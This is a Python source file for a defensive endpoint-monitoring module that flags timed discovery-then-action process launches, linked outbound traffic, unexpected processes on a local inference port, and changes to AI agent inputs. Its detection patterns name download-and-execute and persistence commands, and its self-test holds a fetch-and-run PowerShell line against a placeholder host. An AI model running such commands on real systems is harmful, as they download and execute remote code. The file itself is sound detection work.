"""Advisory evidence for timed discovery/action launches and related network work.

Scripts, schedulers and people can produce the same cadence. Live Sysmon
identity can corroborate a process link. Assess automation, attribution and
possible command-and-control separately. The inference-port watch is independent.
"""
from __future__ import annotations

from collections import OrderedDict, deque
from datetime import datetime, timezone
from ipaddress import ip_address
import math
import re
import threading
import time
from dataclasses import dataclass
from urllib.parse import urlsplit

try:
    import psutil
except Exception:  # pragma: no cover
    psutil = None

from angerona.core.eventbus import is_remote_observe_only
from angerona.core.module_base import BaseModule, Severity
from angerona.core.url_policy import normalize_local_service_base
from angerona.core.process_allowlist import (
    is_digest_pinned_allowed,
    policy_snapshot,
)
from angerona.telemetry.sensors import list_connections

_MIN_PAUSE, _MAX_PAUSE = 1.5, 4.0
_STALE_AFTER = 60.0
# A long-lived, already-reported process generation talking to the same peer
# host in the same role opens a new ephemeral port for every request. Each
# full-endpoint key below is still recorded, but the bus alert for that
# generation/peer/role is repeated at most hourly. A new process generation,
# peer host or listener/client role is reported immediately.
_PORT_GENERATION_REALERT_AFTER = 3600.0
_PORT_GENERATION_KEYS_MAX = 1024
_PORT_ENDPOINT_KEYS_MAX = 4096
# Keep the latest exact-endpoint role as long as hourly generation history;
# the short emission cooldown must not erase a visible role transition.
_PORT_ENDPOINT_RETENTION = 2 * _PORT_GENERATION_REALERT_AFTER
_MAX_LINEAGES = 256
_MAX_CHILDREN = 1024
_MAX_EVENTS_PER_POLL = 512
_MAX_UTC_SECONDS = 253402300799
_SYSMON = "Sysmon Event Bridge"
_PROCESS_MODULES = frozenset((
    "ETW Real-Time Process Sensor", "ETW Core Listener", "Process Monitor",
))
_HEX = re.compile(r"[0-9a-f]{64}\Z")
_GUID = re.compile(r"[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}\Z", re.I | re.ASCII)
_UTC = re.compile(r"[0-9]{4}-[0-9]{2}-[0-9]{2}[ T][0-9]{2}:[0-9]{2}:[0-9]{2}(?:\.[0-9]{1,6})?\Z")
_DISCOVERY = re.compile(
    r"(?<![\w.-])(?:whoami|systeminfo|get-process|get-childitem|tasklist|ipconfig|quser|wmic|"
    r"arp|dir|ls)(?:\.exe)?(?![\w.-])", re.I | re.ASCII,
)
_ACTION = re.compile(
    r"(?<![\w-])(?:invoke-expression|iex|invoke-webrequest|iwr|new-service|frombase64string|"
    r"downloadstring|downloadfile|schtasks(?:\.exe)?\s+/(?:create|change|run|delete)|"
    r"reg(?:\.exe)?\s+(?:add|delete|import))(?![\w.-])", re.I | re.ASCII,
)


def _positive_int(value, maximum):
    if type(value) is str and 0 < len(value) <= 10 and value.isascii() and value.isdecimal():
        value = int(value)
    return value if type(value) is int and 0 < value <= maximum else None


def _guid(value):
    if type(value) is not str or len(value) not in (36, 38):
        return None
    value = value[1:-1] if value.startswith("{") and value.endswith("}") else value
    return value.lower() if _GUID.fullmatch(value) and value != "00000000-0000-0000-0000-000000000000" else None


def _phase_tags(command):
    if type(command) is not str or len(command) > 8192:
        return ()
    return tuple(name for name, pattern in (("discovery", _DISCOVERY), ("action", _ACTION))
                 if pattern.search(command))


def _event_utc(value):
    if type(value) is not str or len(value) > 26 or not _UTC.fullmatch(value):
        return None
    try:
        return datetime.fromisoformat(value).replace(tzinfo=timezone.utc).timestamp()
    except (OSError, OverflowError, ValueError):
        return None


@dataclass(frozen=True, slots=True)
class _Spawn:
    when: float
    phases: tuple[str, ...]
    child: tuple


@dataclass(slots=True)
class _ChildNetwork:
    lineage: tuple
    started: float
    dns_at: float | None = None
    outbound: tuple[float, int, str] | None = None


def _socket_advisory_text(value: object, limit: int) -> str:
    """Bound untrusted socket labels without changing matching or dedup data."""
    if not isinstance(value, str):
        return ""
    clipped = value if len(value) <= limit else value[:limit - 1] + "…"
    return "".join(character if character.isprintable() else "�" for character in clipped)


def _configured_inference_port() -> tuple[int | None, str, str]:
    """Return the configured loopback endpoint without trusting a basename."""
    try:
        from angerona.core.config import Config

        endpoint = normalize_local_service_base(str(Config.load().ollama_host or "").strip())
        parsed = urlsplit(endpoint)
        host = (parsed.hostname or "").casefold()
        if parsed.scheme not in {"http", "https"} or host not in {
            "localhost",
            "127.0.0.1",
            "::1",
        }:
            raise ValueError("configured inference endpoint is not loopback HTTP(S)")
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        if not 1 <= port <= 65535:
            raise ValueError("configured inference port is invalid")
        return port, endpoint, ""
    except Exception as exc:
        return None, "", str(exc)[:500]


@dataclass(frozen=True)
class PortWatchReceipt:
    complete: bool
    observed: int
    port_connections: int
    identity_failures: int
    unexpected: int
    error: str = ""


class CounterAgenticModule(BaseModule):
    CODE = "CAGT"
    NAME = "Counter-Agentic Detection"
    name = "Counter-Agentic Detection"
    description = ("Reviews timed discovery and action launches, corroborated process-linked "
                   "outbound activity, and unexpected inference-port matches.")
    category = "Detection"
    version = "1.14.0"

    _POLL = 2.5      # governed cadence (Adaptive Resource Governor scales this)

    def __init__(self) -> None:
        super().__init__()
        self.state_lock = threading.Lock()
        self._manager = None
        self.timelines: OrderedDict[tuple, list[_Spawn]] = OrderedDict()
        self._chains = {}
        self._children: OrderedDict[tuple, _ChildNetwork] = OrderedDict()
        self._alerted: OrderedDict[tuple, float] = OrderedDict()
        self._observations = deque(maxlen=64)
        self._behavior_gap = False
        self._sysmon_live = False
        self._behavior_binding = None
        self._port_alerted: dict[tuple, float] = {}
        self._port_endpoint_roles: dict[tuple, bool] = {}
        self._port_generation_alerted: dict[tuple, list] = {}
        self._port_policy_snapshot = None
        self._detections = 0
        self._agent_integrity_store = None
        self._agent_integrity_due = 0.0
        self._agent_integrity_signature = None
        self._agent_integrity_status = "unconfigured"
        (
            self._inference_port,
            self._inference_endpoint,
            self._endpoint_error,
        ) = _configured_inference_port()

    @property
    def state(self) -> str:
        return self.status

    @property
    def health_pct(self) -> int:
        return self.health

    # ── bus consumption ──────────────────────────────────────────────────────
    def bind_manager(self, manager):
        self._manager = manager

    def _sysmon_generation(self):
        modules = getattr(self._manager, "modules", None)
        module = modules.get(_SYSMON) if type(modules) is dict else None
        if ((type(module).__module__, type(module).__name__)
                != ("angerona.modules.sysmon_listener", "SysmonListenerModule")):
            return None
        try:
            value = module.collection_snapshot()
        except (OSError, RuntimeError, TypeError, ValueError):
            return None
        if (type(value) is not dict or value.get("mode") != "native" or value.get("live") is not True
                or value.get("source_module") != _SYSMON):
            return None
        generation = value.get("generation")
        return generation if type(generation) is str and _HEX.fullmatch(generation) else None

    def _verified_local(self, event, *, mesh):
        if is_remote_observe_only(event) or getattr(self._bus, "integrity_enabled", None) is not True:
            return False
        signature = getattr(event, "hmac_sig", None)
        if not mesh and (type(signature) is not str or not _HEX.fullmatch(signature)):
            return False
        try:
            return self._bus.verify(event) is True
        except (AttributeError, RuntimeError, TypeError, ValueError, OverflowError, RecursionError):
            return False

    def _ingest_bus(self) -> None:
        if self._bus is None:
            return
        events, overflow = self.poll_bus_events()
        mesh = getattr(self._bus, "mesh_required", None) is True
        generation = self._sysmon_generation() if mesh else None
        gap = overflow or len(events) > _MAX_EVENTS_PER_POLL
        binding = self._bus, self.lifecycle_generation
        new_binding = binding != self._behavior_binding
        if gap or new_binding:
            self.timelines.clear()
            self._chains.clear()
            self._children.clear()
        if new_binding:
            self._behavior_binding = binding
            self._alerted.clear()
        with self.state_lock:
            if new_binding:
                self._behavior_gap = False
                self._observations.clear()
            self._behavior_gap |= bool(gap)
            self._sysmon_live = generation is not None
        now = time.time()
        for event in events[-_MAX_EVENTS_PER_POLL:]:
            details = getattr(event, "details", None)
            if type(details) is not dict:
                continue
            module = getattr(event, "module", "")
            eid = details.get("eid")
            sysmon = module == _SYSMON
            if sysmon:
                if (generation is None or details.get("collection_generation") != generation
                        or details.get("sensor_source") != "sysmon-native"
                        or details.get("raw_sensor_evidence") is not True
                        or type(eid) is not int or eid not in (1, 3, 22)):
                    continue
            elif module not in _PROCESS_MODULES or details.get("event_type") != "process_creation":
                continue
            if not self._verified_local(event, mesh=mesh):
                continue
            pid = _positive_int(details.get("pid"), 0xFFFFFFFF)
            stamp = _event_utc(details.get("source_utc_time")) if sysmon else getattr(event, "ts", None)
            if (pid is None or type(stamp) not in (float, int) or not 0 < stamp <= _MAX_UTC_SECONDS
                    or not -5 <= now - stamp <= _STALE_AFTER):
                continue
            if sysmon:
                process_guid = _guid(details.get("process_guid"))
                if process_guid is None:
                    continue
                child = (generation, process_guid, pid)
                if eid != 1:
                    self._observe_network(child, stamp, eid, details)
                    continue
                parent_pid = _positive_int(details.get("parent_pid"), 0xFFFFFFFF)
                parent_guid = _guid(details.get("parent_process_guid"))
                if parent_pid is None or parent_pid == pid or parent_guid is None or parent_guid == process_guid:
                    continue
                lineage = (_SYSMON, generation, parent_guid, parent_pid)
                self._record_child(lineage, child, stamp, _phase_tags(details.get("command_line")))
            else:
                parent_pid = _positive_int(details.get("ppid"), 0xFFFFFFFF)
                if parent_pid is None or parent_pid == pid:
                    continue
                birth = details.get("process_birth_ticks")
                if (type(birth) is not str or not 1 <= len(birth) <= 20
                        or not birth.isascii() or not birth.isdecimal() or not 0 < int(birth) <= 0xFFFFFFFFFFFFFFFF):
                    birth = details.get("process_create_time")
                    if type(birth) not in (int, float) or not 0 < birth <= stamp or not math.isfinite(birth):
                        birth = stamp
                command = details.get("cmdline")
                if type(command) is not str or not command:
                    command = details.get("command_line")
                self._record_child((module, "", "", parent_pid), (pid, birth), stamp, _phase_tags(command))

    def _record_child(self, lineage, child, stamp, phases):
        timeline = self.timelines.get(lineage, [])
        if timeline and (stamp <= timeline[-1].when or any(row.child == child for row in timeline)):
            return
        if lineage[1]:
            if child in self._children:
                return
            self._children[child] = _ChildNetwork(lineage, stamp)
            if len(self._children) > _MAX_CHILDREN:
                self._children.popitem(last=False)
        timeline.append(_Spawn(stamp, phases, child))
        del timeline[:-12]
        self.timelines[lineage] = timeline
        self.timelines.move_to_end(lineage)
        if len(self.timelines) > _MAX_LINEAGES:
            evicted, _rows = self.timelines.popitem(last=False)
            self._chains.pop(evicted, None)
        if len(timeline) < 3:
            return
        first, middle, last = timeline[-3:]
        d1, d2 = middle.when - first.when, last.when - middle.when
        if not (_MIN_PAUSE <= d1 <= _MAX_PAUSE and _MIN_PAUSE <= d2 <= _MAX_PAUSE):
            return
        if "discovery" not in first.phases or not any("action" in row.phases for row in (middle, last)):
            return
        self._record_observation(lineage, "discovery-action-cadence", last.when,
                                 pauses_seconds=(round(d1, 2), round(d2, 2)),
                                 phases=(first.phases, middle.phases, last.phases))
        if lineage[1]:
            self._chains[lineage] = (middle, last)
            for row in (middle, last):
                network = self._children.get(row.child)
                if network is not None:
                    self._correlate_outbound(row.child, network)

    def _observe_network(self, child, stamp, eid, details):
        network = self._children.get(child)
        if network is None or not 0 <= stamp - network.started <= _STALE_AFTER:
            return
        if eid == 22:
            query = details.get("query_name")
            if type(query) is str and 0 < len(query) <= 253 and query.isprintable():
                network.dns_at = stamp
            return
        port = _positive_int(details.get("dest_port"), 65535)
        protocol = details.get("protocol")
        address = details.get("dest_ip")
        if (details.get("initiated") is not True or port is None or type(protocol) is not str
                or len(protocol) != 3 or protocol.lower() not in {"tcp", "udp"}
                or type(address) is not str or not 0 < len(address) <= 64 or "%" in address):
            return
        try:
            destination = ip_address(address)
        except ValueError:
            return
        destination = getattr(destination, "ipv4_mapped", None) or destination
        if not destination.is_global or destination.is_multicast or destination.is_reserved:
            return
        network.outbound = stamp, port, protocol.lower()
        self._correlate_outbound(child, network)

    def _correlate_outbound(self, child, network):
        if network.outbound is None or not any(
            row.child == child and "action" in row.phases for row in self._chains.get(network.lineage, ())
        ):
            return
        stamp, port, protocol = network.outbound
        self._record_observation(network.lineage, "process-linked-outbound", stamp,
                                 pid=child[2], process_guid=child[1], destination_port=port, transport=protocol,
                                 prior_dns_observed=network.dns_at is not None and network.dns_at <= stamp)

    def _record_observation(self, lineage, kind, stamp, **evidence):
        now = time.time()
        key = (kind, lineage)
        prior = self._alerted.get(key)
        if prior is not None and 0 <= now - prior < _STALE_AFTER:
            return
        self._alerted[key] = now
        self._alerted.move_to_end(key)
        if len(self._alerted) > 2 * _MAX_LINEAGES:
            self._alerted.popitem(last=False)
        module, generation, parent_guid, parent_pid = lineage
        details = dict(event_type="automation_behavior_observation", observation_kind=kind,
                       observed_at=stamp, source_module=module, parent_pid=parent_pid,
                       identity_strength="sysmon-process-guid" if generation else "pid-only",
                       disposition="observation", active_attack=False, response_authorized=False, **evidence)
        if generation:
            details.update(collection_generation=generation, parent_process_guid=parent_guid)
        if kind == "discovery-action-cadence":
            details["mitre"] = "T1059 / T1082"
        with self.state_lock:
            self._observations.append(details)
        self._detections += 1
        message = (f"Discovery and action launches followed a repeated cadence for parent PID {parent_pid}."
                   if kind == "discovery-action-cadence" else
                   f"Action child PID {evidence['pid']} had a verified process link to outbound activity.")
        self.emit(message + " Review the behavior and its coverage.", Severity.HIGH if generation else Severity.MEDIUM,
                  **details)

    def behavior_snapshot(self):
        """Copy recent observations and explicit coverage facts from memory."""
        with self.state_lock:
            return dict(scope="Local automation behavior observations",
                        sysmon_identity_available=self._sysmon_live,
                        bus_coverage_gap=self._behavior_gap,
                        observations=tuple(dict(row) for row in self._observations),
                        response_authorized=False)

    # ── signal 3: local inference-port watch ─────────────────────────────────
    def _watch_ollama_port(self) -> PortWatchReceipt:
        port = self._inference_port
        if port is None:
            return PortWatchReceipt(
                False, 0, 0, 0, 0, self._endpoint_error or "endpoint unavailable"
            )
        if psutil is None:
            return PortWatchReceipt(False, 0, 0, 0, 0, "psutil unavailable")
        try:
            # Share the bounded telemetry snapshot with the other network
            # modules instead of enumerating the kernel connection table every
            # 2.5 seconds independently.
            conns = list_connections()
        except Exception as exc:
            return PortWatchReceipt(False, 0, 0, 0, 0, str(exc)[:500])
        snapshot = getattr(conns, "receipt", None)
        snapshot_complete = bool(getattr(snapshot, "complete", True))
        snapshot_error = str(getattr(snapshot, "error", "") or "")[:500]
        try:
            policy = policy_snapshot()
        except Exception as exc:
            policy = ()
            snapshot_complete = False
            snapshot_error = f"trusted-process policy unavailable: {exc}"[:500]
        if policy != self._port_policy_snapshot:
            # A changed effective approval policy starts fresh observation
            # episodes; a revoked approval must not inherit an older cooldown.
            self._port_alerted.clear()
            self._port_endpoint_roles.clear()
            self._port_generation_alerted.clear()
            self._port_policy_snapshot = policy
        port_connections = 0
        identity_failures = 0
        unexpected = 0
        # Every socket seen in one sweep stays separate evidence; only later
        # sweeps of an already-reported generation/peer/role are rate-limited.
        self._port_sweep = getattr(self, "_port_sweep", 0) + 1
        for c in conns:
            laddr = c.get("laddr") or ""
            raddr = c.get("raddr") or ""
            local_match = bool(laddr and laddr.rsplit(":", 1)[-1] == str(port))
            remote_match = bool(raddr and raddr.rsplit(":", 1)[-1] == str(port))
            port_hit = local_match or remote_match
            pid = c.get("pid")
            if (
                not port_hit
                or isinstance(pid, bool)
                or not isinstance(pid, int)
                or pid <= 0
            ):
                continue
            port_connections += 1
            pname = "<unverified>"
            executable = ""
            created: float | None = None
            identity_error = ""
            identity_complete = False
            try:
                process = psutil.Process(pid)
                created = float(process.create_time())
                if not math.isfinite(created) or created <= 0:
                    raise ValueError("process birth is unavailable or invalid")
                pname = str(process.name() or "<unnamed>")[:260]
                executable = str(process.exe() or "")[:32767]
                if not executable:
                    raise ValueError("process executable path is unavailable")
                if float(process.create_time()) != created:
                    raise ValueError("process generation changed during lookup")
                identity_complete = True
            except Exception as exc:
                identity_failures += 1
                identity_error = str(exc)[:500] or "process identity unavailable"
                # A first-read annotation must never become verified identity
                # after the second birth read failed or observed PID reuse.
                created, executable = None, ""
            allowed = bool(
                identity_complete
                and is_digest_pinned_allowed(
                    pname, executable, policy=policy
                )
            )
            if allowed:
                # Current bytes were checked against the exact pinned policy.
                # Resolve only this verified subject's repeat history, so a
                # later digest mismatch reports again even without a policy edit.
                self._resolve_port_subject((pid, created, executable.casefold()))
            else:
                unexpected += 1
                key = (
                    pid,
                    created if created is not None else 0.0,
                    executable.casefold(),
                    laddr,
                    raddr,
                )
                now = time.time()
                raw_status = c.get("status")
                listener = isinstance(raw_status, str) and raw_status == "LISTEN"
                prior_role = self._port_endpoint_roles.get(key)
                role_changed = prior_role is not None and prior_role != listener
                dedup_window = _STALE_AFTER if identity_complete else 10.0
                last_endpoint_report = self._port_alerted.get(key)
                if (not role_changed and last_endpoint_report is not None
                        and 0 <= now - last_endpoint_report < dedup_window):
                    continue
                generation_key = None
                same_sweep = False
                suppressed_repeats = 0
                if identity_complete:
                    generation_key = (
                        pid, created, executable.casefold(),
                        laddr.rsplit(":", 1)[0], raddr.rsplit(":", 1)[0],
                        local_match, remote_match,
                        listener,
                    )
                    prior = self._port_generation_alerted.get(generation_key)
                    same_sweep = prior is not None and prior[2] == self._port_sweep
                    if (prior is not None and not same_sweep and not role_changed
                            and 0 <= now - prior[0] < _PORT_GENERATION_REALERT_AFTER):
                        # This counts report opportunities, including later
                        # polls of one socket, never distinct connections.
                        prior[1] += 1
                        continue
                    if not same_sweep:
                        suppressed_repeats = prior[1] if prior is not None else 0
                if key not in self._port_alerted and len(self._port_alerted) >= _PORT_ENDPOINT_KEYS_MAX:
                    oldest = min(self._port_alerted, key=self._port_alerted.get)
                    self._discard_port_endpoint(oldest)
                self._port_alerted[key] = now
                self._port_endpoint_roles[key] = listener
                if generation_key is not None and (not same_sweep
                        or generation_key not in self._port_generation_alerted):
                    if (generation_key not in self._port_generation_alerted
                            and len(self._port_generation_alerted) >= _PORT_GENERATION_KEYS_MAX):
                        oldest = min(self._port_generation_alerted,
                                     key=lambda item: self._port_generation_alerted[item][0])
                        del self._port_generation_alerted[oldest]
                    self._port_generation_alerted[generation_key] = [now, 0, self._port_sweep]
                self._detections += 1
                socket_status = _socket_advisory_text(raw_status, 64) or "UNKNOWN"
                matched_endpoint = (
                    "both" if local_match and remote_match
                    else "local" if local_match else "remote"
                )
                # Local/remote describe the snapshot endpoints, not who
                # initiated a connection. Only an explicit listening state
                # establishes a listener; every other role remains a match.
                socket_role = (
                    "listener" if isinstance(raw_status, str)
                    and raw_status == "LISTEN" and local_match
                    else f"{matched_endpoint}-port-match"
                )
                self.emit(
                    f"Unexpected process '{pname}' (PID {pid}) owns an observed socket "
                    f"matching configured inference port number {port} "
                    f"(state {socket_status}; role {socket_role}). "
                    "Review socket and process identity; a port match alone does not "
                    "establish locality, initiator or misuse (detection only).",
                    Severity.HIGH, pid=pid, process=pname, port=port,
                    configured_endpoint=self._inference_endpoint,
                    socket_status=socket_status,
                    local_endpoint=_socket_advisory_text(laddr, 1024),
                    remote_endpoint=_socket_advisory_text(raddr, 1024),
                    matched_endpoint=matched_endpoint,
                    socket_role=socket_role,
                    socket_metadata_advisory=True,
                    suppressed_repeats=suppressed_repeats,
                    suppressed_repeats_unit="emission-opportunities",
                    disposition="observation",
                    process_create_time=created,
                    process_path=executable,
                    process_identity_complete=identity_complete,
                    identity_error=identity_error,
                    authorization_policy="exact-path-sha256-operator-approval",
                    response_authorized=False,
                    mitre="T1071 (Application Layer Protocol) / T1059")
        errors = [value for value in (snapshot_error,) if value]
        if identity_failures:
            errors.append(f"{identity_failures} process identity lookup(s) failed")
        return PortWatchReceipt(
            snapshot_complete and identity_failures == 0,
            len(conns),
            port_connections,
            identity_failures,
            unexpected,
            "; ".join(errors)[:500],
        )

    def _resolve_port_subject(self, subject):
        # Both maps have hard limits; no current-PID lookup or learned approval.
        for key in tuple(self._port_alerted):
            if key[:3] == subject:
                self._discard_port_endpoint(key)
        for key in tuple(self._port_generation_alerted):
            if key[:3] == subject:
                del self._port_generation_alerted[key]

    def _discard_port_endpoint(self, key):
        self._port_alerted.pop(key, None)
        self._port_endpoint_roles.pop(key, None)
        # Losing the latest endpoint role also loses authority to apply an
        # older hourly history to a returning socket in either role. Eviction
        # can permit another report; it must not hide a role transition.
        pid, created, executable, local, remote = key
        prefix = (
            pid, created, executable,
            local.rsplit(":", 1)[0], remote.rsplit(":", 1)[0],
            bool(local and local.rsplit(":", 1)[-1] == str(self._inference_port)),
            bool(remote and remote.rsplit(":", 1)[-1] == str(self._inference_port)),
        )
        for listener in (False, True):
            self._port_generation_alerted.pop(prefix + (listener,), None)

    # ── housekeeping ─────────────────────────────────────────────────────────
    def _prune(self) -> None:
        now = time.time()
        stale = [lineage for lineage, timeline in self.timelines.items()
                 if now - timeline[-1].when > _STALE_AFTER]
        for lineage in stale:
            del self.timelines[lineage]
            self._chains.pop(lineage, None)
        for key, child in tuple(self._children.items()):
            if now - child.started > _STALE_AFTER or child.lineage not in self.timelines:
                del self._children[key]
        for key, ts in list(self._alerted.items()):
            if now - ts > 4 * _STALE_AFTER:
                del self._alerted[key]
        for key, ts in list(self._port_alerted.items()):
            if now - ts > _PORT_ENDPOINT_RETENTION:
                self._discard_port_endpoint(key)
        for key, state in list(self._port_generation_alerted.items()):
            if now - state[0] > 2 * _PORT_GENERATION_REALERT_AFTER:
                del self._port_generation_alerted[key]

    # ── lifecycle ────────────────────────────────────────────────────────────
    def _check_agent_integrity(self):
        """Configured agent inputs only; no discovery, content execution or rebaseline."""
        now = time.monotonic()
        if now < self._agent_integrity_due:
            return
        self._agent_integrity_due = now + 60.0
        from angerona.core.agent_integrity import AgentIntegrityStore
        try:
            if self._agent_integrity_store is None:
                self._agent_integrity_store = AgentIntegrityStore.current()
            result = self._agent_integrity_store.verify()
        except Exception:
            result = {"status": "unavailable", "files": []}
        self._agent_integrity_status = result["status"]
        signature = (result["status"], tuple(
            (row["target_id"], row["status"], row["observed_sha256"])
            for row in result["files"]
        ))
        if signature == self._agent_integrity_signature:
            return
        self._agent_integrity_signature = signature
        if result["status"] in {"drift", "unavailable"}:
            self.emit(
                "Enrolled AI agent instructions, memory or tool definitions changed or became "
                "unavailable. Configured Angerona tool actions are withheld until explicit review.",
                Severity.HIGH, event_type="agent_input_integrity", response_authority=False,
                finding_code="agent.input.integrity", agent_integrity=result,
            )

    def run(self) -> None:
        self.emit("CAGT online — automation behavior review and inference-port watch.", Severity.INFO)
        while not self.stopping:
            try:
                self._ingest_bus()
                coverage = self._watch_ollama_port()
                self._prune()
                self._check_agent_integrity()
                if self._agent_integrity_status in {"drift", "unavailable"}:
                    self.set_health(55, "configured agent input integrity requires operator review")
                elif coverage.complete and self._behavior_gap:
                    self.set_health(70, "Automation event delivery had a gap. Review observations with incomplete coverage.")
                elif coverage.complete:
                    self.set_health(
                        100,
                        f"complete connection snapshot ({coverage.observed} rows; "
                        f"{coverage.port_connections} on configured inference port), "
                        f"{len(self.timelines)} tracked lineages, "
                        f"{self._detections} detections; agent input baselines "
                        f"{self._agent_integrity_status}",
                    )
                else:
                    self.set_health(
                        65,
                        "inference-port coverage incomplete: "
                        f"{coverage.error or 'identity evidence unavailable'}; "
                        f"rows={coverage.observed}, port_rows="
                        f"{coverage.port_connections}",
                    )
            except Exception as exc:
                self.last_error = str(exc)
                self.set_health(60, f"analysis error: {exc}")
            self.sleep(self._POLL)

    def self_test(self) -> tuple[bool, str]:
        """Exercise advisory discovery/action cadence with a benign control."""
        t0 = 1000.0
        agentic = [(t0, "whoami /all"), (t0 + 2.2, "get-process"),
                   (t0 + 4.4, "powershell iex(iwr http://x/a.ps1)")]
        benign = [(t0, "explorer.exe"), (t0 + 0.1, "notepad.exe"),
                  (t0 + 0.2, "calc.exe")]

        # Drive detection through a throwaway instance with a capture bus.
        observed = []

        class _Bus:
            def publish(self, ev):
                observed.append(ev)

        probe = CounterAgenticModule()
        probe.bind(_Bus())
        for parent, commands in ((1234, agentic), (5678, benign)):
            for index, (stamp, command) in enumerate(commands):
                probe._record_child(("fixture", "", "", parent), (index, stamp), stamp, _phase_tags(command))
        ok = (len(observed) == 1 and observed[0].severity == Severity.MEDIUM
              and observed[0].details["disposition"] == "observation"
              and observed[0].details["response_authorized"] is False
              and "action" not in _phase_tags("schtasks /query"))
        return ok, ("Advisory cadence and benign control verified" if ok else "Advisory cadence fixture failed")


def register() -> CounterAgenticModule:
    return CounterAgenticModule()
